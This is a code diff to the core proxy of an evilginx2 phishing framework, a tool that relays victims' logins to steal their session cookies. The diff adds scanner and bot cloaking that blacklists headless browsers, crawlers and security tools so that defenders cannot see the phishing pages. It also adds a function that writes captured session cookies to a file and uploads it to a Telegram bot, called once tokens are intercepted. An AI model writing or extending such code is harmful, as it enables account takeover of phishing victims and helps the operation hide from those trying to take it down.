@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
@@ -18,8 +19,8 @@ import (
 	"fmt"
 	"html"
 	"io"
+	"io/fs"
 	"io/ioutil"
-	"math/rand"
 	"mime/multipart"
 	"net"
 	"net/http"
@@ -44,110 +45,6 @@ import (
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 )
-
-// tid to original URL mapping (thread-safe)
-var tidUrlMap = struct {
-	sync.RWMutex
-	m map[string]string
-}{m: make(map[string]string)}
-
-func genTid() string {
-	// Generate four 8-digit numbers separated by hyphens
-	// Format: xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx
-	part1 := fmt.Sprintf("%08d", rand.Intn(100000000))
-	part2 := fmt.Sprintf("%08d", rand.Intn(100000000))
-	part3 := fmt.Sprintf("%08d", rand.Intn(100000000))
-	part4 := fmt.Sprintf("%08d", rand.Intn(100000000))
-	return part1 + "-" + part2 + "-" + part3 + "-" + part4
-}
-
-// Check if request matches a rewrite rule, return (rewrite, tid) if so
-func checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string, tid string, matched bool) {
-	if pl == nil {
-		return "", "", false
-	}
-	
-	host := req.Host
-	path := req.URL.Path
-	
-	for _, ru := range pl.rewriteUrls {
-		domainMatch := false
-		for _, d := range ru.triggerDomains {
-			if d == host {
-				domainMatch = true
-				break
-			}
-		}
-		if !domainMatch {
-			continue
-		}
-		
-		for _, triggerPath := range ru.triggerPaths {
-			if triggerPath == path {
-				tid = genTid()
-				
-				origUrl := path
-				if req.URL.RawQuery != "" {
-					origUrl += "?" + req.URL.RawQuery
-				}
-				
-				tidUrlMap.Lock()
-				tidUrlMap.m[tid] = origUrl
-				tidUrlMap.Unlock()
-				
-				// Parse original query parameters
-				origQuery, _ := url.ParseQuery(req.URL.RawQuery)
-				
-				// Build new query parameters starting with original ones
-				q := url.Values{}
-				for key, values := range origQuery {
-					for _, value := range values {
-						q.Add(key, value)
-					}
-				}
-				
-				// Add rewrite query parameters (overriding if needed)
-				for _, qv := range ru.rewriteQuery {
-					val := qv.Value
-					if val == "{id}" {
-						val = tid
-					}
-					q.Set(qv.Key, val)
-				}
-				redirectUrl = ru.rewritePath
-				if len(q) > 0 {
-					redirectUrl += "?" + q.Encode()
-				}
-				return redirectUrl, tid, true
-			}
-		}
-	}
-	return "", "", false
-}
-
-// If request is to a rewritten URL, restore original URL
-func restoreOriginalUrlIfTid(req *http.Request) bool {
-	tid := req.URL.Query().Get("tid")
-	if tid == "" {
-		return false
-	}
-	
-	tidUrlMap.RLock()
-	orig, ok := tidUrlMap.m[tid]
-	tidUrlMap.RUnlock()
-	if !ok {
-		return false
-	}
-	
-	u, err := url.Parse(orig)
-	if err != nil {
-		return false
-	}
-	
-	req.URL.Path = u.Path
-	req.URL.RawQuery = u.RawQuery
-	return true
-}
 
 const (
 	CONVERT_TO_ORIGINAL_URLS = 0
@@ -211,6 +108,126 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+func (p *HttpProxy) detectHeadless(req *http.Request) bool {
+	from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+	suspiciousPoints := 0
+	maxSuspiciousPoints := 7 // Increased threshold to account for new checks
+
+	// Helper function to increment suspicious points and log
+	logSuspicious := func(reason string) {
+		suspiciousPoints++
+		log.Debug("Suspicious behavior (%s) from IP: %s", reason, from_ip)
+	}
+
+	ua := req.Header.Get("User-Agent")
+
+	// Check for missing or very basic User-Agent
+	if ua == "" || ua == "Mozilla/5.0" {
+		logSuspicious("basic User-Agent")
+	}
+
+	// Check for outdated browsers
+	if isOutdatedBrowser(ua) {
+		logSuspicious("outdated browser")
+		suspiciousPoints += 2 // Add extra point for outdated browsers
+	}
+
+	// Check for missing Accept-Language
+	if req.Header.Get("Accept-Language") == "" {
+		logSuspicious("missing Accept-Language")
+	}
+
+	// Check for X-Headless-Request header
+	if req.Header.Get("X-Headless-Request") != "" {
+		logSuspicious("X-Headless-Request present")
+	}
+
+	// Check for overly permissive Accept header
+	if req.Header.Get("Accept") == "*/*" {
+		logSuspicious("permissive Accept")
+	}
+
+	// Check for suspicious Referer
+	referer := req.Header.Get("Referer")
+	if strings.HasPrefix(referer, "about:blank") {
+		logSuspicious("suspicious Referer")
+	}
+
+	// Check for missing modern headers (but don't weigh too heavily)
+	if req.Header.Get("Sec-Ch-Ua") == "" && req.Header.Get("Sec-Ch-Ua-Mobile") == "" {
+		logSuspicious("missing modern headers")
+	}
+
+	isHeadless := suspiciousPoints >= maxSuspiciousPoints
+
+	if isHeadless {
+		log.Warning("Detected likely headless or outdated browser from IP: %s (Score: %d/%d)", from_ip, suspiciousPoints, maxSuspiciousPoints)
+
+		// Add the IP to the blacklist
+		err := p.bl.AddIP(from_ip)
+		if err != nil {
+			log.Error("blacklist: %s", err)
+		} else if p.bl.IsVerbose() {
+			log.Warning("blacklisted IP address: %s", from_ip)
+		}
+	}
+
+	return isHeadless
+}
+
+// Helper function to check for outdated browsers
+func isOutdatedBrowser(ua string) bool {
+	outdatedPatterns := []string{
+		"MSIE",
+		"Firefox/[1-60]\\.",
+		"Chrome/[1-80]\\.",
+		"Safari/[1-12]\\.",
+		"Opera/[1-9]\\.",
+		"Opera/[1-2][0-9]\\.",
+		"Windows NT 5",
+		"Windows NT 6.0",
+		"Windows NT 6.1",
+	}
+
+	for _, pattern := range outdatedPatterns {
+		if matched, _ := regexp.MatchString(pattern, ua); matched {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (p *HttpProxy) injectHeadlessDetectionScript(body []byte) []byte {
+	script := `
+	  <script>
+		function detectHeadlessBrowser() {
+		  var isHeadless = false;
+  
+		  // Check for unusual navigator properties
+		  if (navigator.webdriver || navigator.userAgent.indexOf("Headless") > -1) {
+			isHeadless = true;
+		  }
+  
+		  // Additional checks for headless browsers
+		  if (window.callPhantom || window._phantom || window.__nightmare || navigator.plugins.length === 0) {
+			isHeadless = true;
+		  }
+  
+		  if (isHeadless) {
+			// Log or block request (depends on how you wish to handle it)
+			console.log("Headless browser detected.");
+			// You could trigger a server-side request to block this client
+		  }
+		}
+  
+		window.onload = detectHeadlessBrowser;
+	  </script>
+	`
+	return p.injectJavascriptIntoBody(body, script, "")
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -261,17 +278,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			// --- Begin rewrite_urls logic ---
-			pl := p.getPhishletByPhishHost(req.Host)
-			
-			if restoreOriginalUrlIfTid(req) {
-				// URL was restored, continue normal processing
-			} else if redirectUrl, _, matched := checkAndRewriteRequest(pl, req); matched {
-				resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-				resp.Header.Add("Location", redirectUrl)
-				return req, resp
-			}
-			// --- End rewrite_urls logic ---
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -292,6 +298,91 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if origin_ip != "" {
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
+				}
+			}
+
+			// Block requests without a User-Agent header
+			userAgent := req.Header.Get("User-Agent")
+			if userAgent == "" {
+				log.Warning("Blocked request without User-Agent header from IP: %s", from_ip)
+				err := p.bl.AddIP(from_ip)
+				if p.bl.IsVerbose() {
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					} else {
+						log.Warning("blacklisted ip address: %s", from_ip)
+					}
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block requests from headless browsers
+			headlessIndicators := []string{
+				"HeadlessChrome", "PhantomJS", "SlimerJS", "Trident", "Wget", "curl", "HttpClient", "Java", "Python", "Go-http-client",
+			}
+			for _, indicator := range headlessIndicators {
+				if strings.Contains(userAgent, indicator) {
+					log.Warning("Blocked request from headless browser: %s, User-Agent: %s", from_ip, userAgent)
+					err := p.bl.AddIP(from_ip)
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					}
+					return p.blockRequest(req)
+				}
+			}
+
+			// Block requests from outdated browsers
+			if isOutdatedBrowser(userAgent) {
+				log.Warning("Blocked request from outdated browser: %s, User-Agent: %s", from_ip, userAgent)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Additional server-side headless detection
+			if p.detectHeadless(req) {
+				log.Warning("Blocked request from headless browser: %s", from_ip)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block requests not coming from macOS, Windows, iPhone, or Android
+			allowedOS := []string{"Macintosh", "Windows", "iPhone", "Android"}
+			isAllowed := false
+			for _, os := range allowedOS {
+				if strings.Contains(userAgent, os) {
+					isAllowed = true
+					break
+				}
+			}
+			if !isAllowed {
+				log.Warning("Blocked request from disallowed OS: %s, User-Agent: %s", from_ip, userAgent)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block known bots
+			knownBots := []string{
+				"Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver",
+				"archive.org_bot", "telegrambot", "twitterbot", "bingbot", "msnbot", "bot", "crawl", "spider", "curl", "wget", "httpclient",
+				"java", "python", "php", "facebookexternalhit", "googlebot",
+			}
+			for _, bot := range knownBots {
+				if strings.Contains(userAgent, bot) {
+					log.Warning("Blocked request from known bot: %s, User-Agent: %s", from_ip, userAgent)
+					err := p.bl.AddIP(from_ip)
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					}
+					return p.blockRequest(req)
 				}
 			}
 
@@ -319,7 +410,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			// o_host := req.Host
+			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -327,7 +418,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			pl = p.getPhishletByPhishHost(req.Host)
+			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -416,7 +507,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -430,26 +521,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							create_session = false
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-							
-							// Extract email parameter from URL for existing session
-							email := req.URL.Query().Get("email")
-							if email != "" {
-								// Get the existing session and update email parameter
-								if session, exists := p.sessions[ps.SessionId]; exists {
-									session.Params["email"] = email
-									log.Important("[%s] Email updated in existing session: %s", pl_name, email)
-								}
-							} else {
-								// Only remove email if it's explicitly empty (email=) not if it's missing
-								if req.URL.Query().Has("email") {
-									if session, exists := p.sessions[ps.SessionId]; exists {
-										if _, hasEmail := session.Params["email"]; hasEmail {
-											delete(session.Params, "email")
-											log.Important("[%s] Email removed from existing session (explicitly empty)", pl_name)
-										}
-									}
-								}
-							}
 						} else {
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
@@ -512,21 +583,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if err == nil {
 									// set params from url arguments
 									p.extractParams(session, req.URL)
-									
-									// Extract email parameter from URL if present
-									email := req.URL.Query().Get("email")
-									if email != "" {
-										// Always overwrite any previous email value
-										session.Params["email"] = email
-										log.Important("[%s] Email captured from URL: %s", pl_name, email)
-									} else {
-										// Email parameter not found or empty - check if email exists in session and delete it
-										if _, hasEmail := session.Params["email"]; hasEmail {
-											delete(session.Params, "email")
-											log.Important("[%s] Email removed from new session", pl_name)
-										}
-									}
-
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
@@ -579,8 +635,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 									}
 									session.PhishLure = l
-									session.TelegramBotToken = p.cfg.GetTelegramBotToken()
-									session.TelegramUserID = p.cfg.GetTelegramUserID()
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									ps.SessionId = session.Id
@@ -619,11 +673,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				// req.Header.Set(p.getHomeDir(), o_host)
+				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
+						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
 							if l.Redirector != "" {
@@ -729,7 +783,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
+					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
@@ -801,9 +855,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
-									qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
-								}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -812,7 +863,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					// req.Header.Set(p.getHomeDir(), o_host)
+					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1037,81 +1088,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
-			// --- Begin rewrite_urls response logic ---
-			if resp != nil {
-				resp.Header.Set("Referrer-Policy", "no-referrer")
-				pl := p.getPhishletByOrigHost(strings.ToLower(resp.Request.Host))
-				if pl != nil && resp.Header.Get("Location") != "" {
-					locUrl, err := url.Parse(resp.Header.Get("Location"))
-					if err == nil {
-						for _, ru := range pl.rewriteUrls {
-							// Check if trigger domains match
-							domainMatched := false
-							var triggerDomain string
-							for _, d := range ru.triggerDomains {
-								if d == locUrl.Host {
-									domainMatched = true
-									triggerDomain = d
-									break
-								}
-							}
-
-							if domainMatched {
-								// Check if trigger paths match
-								pathMatched := false
-								for _, pth := range ru.triggerPaths {
-									if pth == locUrl.Path {
-										pathMatched = true
-										break
-									}
-								}
-
-								if pathMatched {
-									tid := genTid()
-									origUrl := locUrl.Path
-									if locUrl.RawQuery != "" {
-										origUrl += "?" + locUrl.RawQuery
-									}
-
-									// Store original URL mapping
-									tidUrlMap.Lock()
-									tidUrlMap.m[tid] = origUrl
-									tidUrlMap.Unlock()
-
-									// Build query parameters
-									q := url.Values{}
-									for _, qv := range ru.rewriteQuery {
-										val := qv.Value
-										if val == "{id}" {
-											val = tid
-										}
-										q.Set(qv.Key, val)
-									}
-
-									// Convert trigger domain to phishing domain
-									phishHost, found := p.replaceHostWithPhished(triggerDomain)
-									if !found {
-										// Fallback to original behavior if conversion fails
-										phishHost = locUrl.Host
-									}
-
-									// Build the complete rewritten URL using phishing domain
-									rewriteUrl := "https://" + phishHost + ru.rewritePath
-
-									// Add query parameters if any
-									if len(q) > 0 {
-										rewriteUrl += "?" + q.Encode()
-									}
-
-									resp.Header.Set("Location", rewriteUrl)
-									break
-								}
-							}
-						}
-					}
-				}
-			}
-			// --- End rewrite_urls response logic ---
 			if resp == nil {
 				return nil
 			}
@@ -1298,6 +1274,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if err != nil {
 							log.Error("failed to send tokens to Telegram: %v", err)
 						} else {
+							// Log success message for sending cookies
 							log.Success("Captured cookies successfully sent to Telegram for session: %s", ps.SessionId)
 						}
 
@@ -1439,13 +1416,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-							}
 
-							// Also send captured cookie tokens to Telegram bot in auth_urls flow
-							if s != nil {
-								if tgErr := p.SendCapturedCookieTokensToTelegramBot(s); tgErr != nil {
-									log.Error("failed to send tokens to Telegram: %v", tgErr)
+								err := p.SendCapturedCookieTokensToTelegramBot(s)
+								if err != nil {
+									log.Error("failed to send tokens to Telegram: %v", err)
 								} else {
+									// Log success message for sending cookies
 									log.Success("Captured cookies successfully sent to Telegram for session: %s", ps.SessionId)
 								}
 							}
@@ -1515,6 +1491,151 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 		}
 	}
 	return "", false
+}
+
+func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
+	}
+
+	// Convert cookie tokens to JSON
+	var cookies []*Cookie
+	for domain, tmap := range ps.CookieTokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         false,
+			}
+			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
+				c.Secure = true
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	jsonTokens, err := json.Marshal(cookies)
+	if err != nil {
+		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
+	}
+
+	// Use username in filename, fallback to session ID if username is empty
+	fileIdentifier := ps.Username
+	if fileIdentifier == "" {
+		fileIdentifier = ps.Id
+	}
+
+	// Sanitize the fileIdentifier to ensure it's a valid filename
+	fileIdentifier = sanitizeFilename(fileIdentifier)
+
+	// Save the JSON data to a file
+	filename := fmt.Sprintf("%s", ps.Username)
+	err = os.WriteFile(filename, jsonTokens, fs.FileMode(0644))
+	if err != nil {
+		return fmt.Errorf("failed to save JSON file: %v", err)
+	}
+
+	if ps.TelegramBotToken == "" || ps.TelegramUserID == "" {
+		log.Warning("Telegram bot token or user ID not set. Set them to enable Telegram notifications.")
+		return nil
+	}
+
+	// Send the file to the Telegram bot
+	message := fmt.Sprintf("Captured cookies for user: %s", ps.Username)
+	botAPI := ps.TelegramBotToken // Use the session value
+	chatID := ps.TelegramUserID   // Use the session value
+	err = SendMessageFileToTelegramBot(filename, message, botAPI, chatID)
+	if err != nil {
+		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
+	}
+	// Return nil to indicate success
+	return nil
+}
+
+func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) error {
+	// Open the file
+	file, err := os.Open(filename)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	// Create a new multipart writer
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	// Add the file to the request
+	part, err := writer.CreateFormFile("document", filename)
+	if err != nil {
+		return err
+	}
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return err
+	}
+
+	// Add other fields to the request
+	writer.WriteField("chat_id", chatID)
+	writer.WriteField("caption", message)
+
+	// Close the multipart writer
+	writer.Close()
+
+	// Create a new HTTP POST request
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botAPI)
+	req, err := http.NewRequest("POST", url, body)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	// Send the request
+	client := &http.Client{}
+	_, err = client.Do(req)
+	if err != nil {
+		return err
+	}
+
+	// Return nil to indicate success
+	return nil
+}
+
+// Helper function to sanitize filename
+func sanitizeFilename(filename string) string {
+	// Replace invalid characters with underscores
+	invalidChars := regexp.MustCompile(`[<>:"/\\|?*\x00-\x1F]`)
+
+	sanitized := invalidChars.ReplaceAllString(filename, "_")
+
+	// Trim spaces and dots from the beginning and end
+	sanitized = strings.Trim(sanitized, " .")
+
+	// If the filename is empty after sanitization, use a default name
+	if sanitized == "" {
+		sanitized = "unknown_user"
+	}
+
+	return sanitized
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
@@ -2036,9 +2157,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-// func (p *HttpProxy) getHomeDir() string {
-// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-// }
+func (p *HttpProxy) getHomeDir() string {
+	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -2230,154 +2351,8 @@ func getContentType(path string, data []byte) string {
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
-	hash := sha256.Sum256([]byte(pl_name + "-standard-open-federation-" + cookie_name))
+	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
-}
-
-func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
-	type Cookie struct {
-		Path           string `json:"path"`
-		Domain         string `json:"domain"`
-		ExpirationDate int64  `json:"expirationDate"`
-		Value          string `json:"value"`
-		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
-		Secure         bool   `json:"secure,omitempty"`
-	}
-
-	// Convert cookie tokens to JSON
-	var cookies []*Cookie
-	for domain, tmap := range ps.CookieTokens {
-		for k, v := range tmap {
-			c := &Cookie{
-				Path:           v.Path,
-				Domain:         domain,
-				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
-				Value:          v.Value,
-				Name:           k,
-				HttpOnly:       v.HttpOnly,
-				Secure:         false,
-			}
-			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
-				c.Secure = true
-			}
-			if domain[:1] == "." {
-				c.HostOnly = false
-				c.Domain = domain[1:]
-			} else {
-				c.HostOnly = true
-			}
-			if c.Path == "" {
-				c.Path = "/"
-			}
-			cookies = append(cookies, c)
-		}
-	}
-
-	jsonTokens, err := json.Marshal(cookies)
-	if err != nil {
-		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
-	}
-
-	// Use username in filename, fallback to session ID if username is empty
-	fileIdentifier := ps.Username
-	if fileIdentifier == "" {
-		fileIdentifier = ps.Id
-	}
-
-	// Sanitize the fileIdentifier to ensure it's a valid filename
-	fileIdentifier = sanitizeFilename(fileIdentifier)
-
-	// Save the JSON data to a file
-	filename := fileIdentifier + ".json"
-	if err = os.WriteFile(filename, jsonTokens, 0644); err != nil {
-		return fmt.Errorf("failed to save JSON file: %v", err)
-	}
-
-	if ps.TelegramBotToken == "" || ps.TelegramUserID == "" {
-		log.Warning("Telegram bot token or user ID not set. Set them to enable Telegram notifications.")
-		return nil
-	}
-
-	// Send the file to the Telegram bot
-	message := fmt.Sprintf("Captured cookies for user: %s", ps.Username)
-	botAPI := ps.TelegramBotToken // Use the session value
-	chatID := ps.TelegramUserID   // Use the session value
-	err = SendMessageFileToTelegramBot(filename, message, botAPI, chatID)
-	if err != nil {
-		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
-	}
-	// Cleanup temporary file
-	_ = os.Remove(filename)
-	// Return nil to indicate success
-	return nil
-}
-
-func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) error {
-	// Open the file
-	file, err := os.Open(filename)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	// Create a new multipart writer
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	// Add the file to the request
-	part, err := writer.CreateFormFile("document", filename)
-	if err != nil {
-		return err
-	}
-	_, err = io.Copy(part, file)
-	if err != nil {
-		return err
-	}
-
-	// Add other fields to the request
-	writer.WriteField("chat_id", chatID)
-	writer.WriteField("caption", message)
-
-	// Close the multipart writer
-	writer.Close()
-
-	// Create a new HTTP POST request
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botAPI)
-	req, err := http.NewRequest("POST", url, body)
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	// Send the request
-	client := &http.Client{}
-	_, err = client.Do(req)
-	if err != nil {
-		return err
-	}
-
-	// Return nil to indicate success
-	return nil
-}
-
-// Helper function to sanitize filename
-func sanitizeFilename(filename string) string {
-	// Replace invalid characters with underscores
-	invalidChars := regexp.MustCompile(`[<>:"/\\|?*\x00-\x1F]`)
-
-	sanitized := invalidChars.ReplaceAllString(filename, "_")
-
-	// Trim spaces and dots from the beginning and end
-	sanitized = strings.Trim(sanitized, " .")
-
-	// If the filename is empty after sanitization, use a default name
-	if sanitized == "" {
-		sanitized = "unknown_user"
-	}
-
-	return sanitized
 }
